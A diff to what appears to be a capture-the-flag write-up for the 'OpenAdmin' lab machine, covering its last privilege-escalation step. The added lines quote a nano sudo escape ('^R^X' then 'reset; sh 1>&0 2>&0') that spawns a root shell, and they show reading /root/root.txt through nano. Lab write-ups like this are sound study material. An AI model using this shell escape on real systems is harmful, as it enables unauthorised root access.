@@ -107,7 +107,16 @@ Standard enumeration was enough for this machine,sudo -l command shows that user
 
 Reading root.txt is pretty straight forward, this technique is already well document in GTFBIN
 
-sudo /bin/nano /opt/priv. Then we type <CTRL>+R in order to read a file.
+> t can be used to break out from restricted environments by spawning an interactive system shell.
+>nano
+>^R^X
+>reset; sh 1>&0 2>&0
+
+sudo /bin/nano /opt/priv. Then we type <CTRL>+R /root/root.txt in order to read a file.
+
+OpenAdmin is rooted!
+
+
 
 
 
